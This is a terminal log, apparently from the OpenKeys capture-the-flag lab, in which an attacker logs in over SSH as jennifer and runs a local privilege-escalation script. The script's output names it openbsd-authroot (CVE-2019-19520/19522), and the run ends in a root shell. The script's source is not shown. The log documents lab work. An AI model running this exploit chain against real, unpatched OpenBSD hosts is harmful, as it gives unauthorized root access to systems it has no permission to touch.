root@Blue3:.../openkeys# ssh jennifer@openkeys.htb -i jennifer.pub
Last login: Tue Sep 15 10:19:27 2020 from 10.10.14.25
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$ whoami
jennifer
openkeys$ cat /home/jennifer/user.txt
********************************

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

openkeys$ pwd
/tmp
openkeys$ nano exploit.sh
openkeys$ whoami
jennifer
openkeys$ ls -lra
total 16
-rw-r--r--   1 jennifer  wheel  3906 Sep 15 10:50 exploit.sh
drwxr-xr-x  13 root      wheel   512 Sep 15 04:51 ..
drwxrwxrwt   2 root      wheel   512 Sep 15 10:50 .
openkeys$ chmod 777 exploit.sh
openkeys$ chmod +x exploit.sh
openkeys$ ./exploit.sh
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
openkeys# whoami
root
